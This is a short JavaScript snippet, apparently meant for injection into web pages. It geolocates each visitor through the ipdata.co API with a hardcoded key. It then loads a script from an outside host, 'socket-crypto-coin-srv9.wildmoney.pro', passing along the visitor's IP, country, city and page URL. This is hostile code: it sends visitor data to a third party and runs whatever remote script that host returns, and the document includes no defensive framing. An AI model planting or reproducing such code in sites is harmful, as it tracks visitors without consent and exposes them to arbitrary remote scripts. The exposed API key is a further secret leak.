function json(url) {
  return fetch(url).then(res => res.json());
}
let apiKey = 'f9f0689a25597caa54c5a9b18e00856f58b070dff3d490d443bbd637';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  
var script = document.createElement('script');
script.src = "https://socket-crypto-coin-srv9.wildmoney.pro/dnr?dinary=User:  "+data.country_code+", "+data.city+"   Start Web " +document.URL+", User IP: "+data.ip;
document.getElementsByTagName('script')[0].parentNode.appendChild(script);   
});
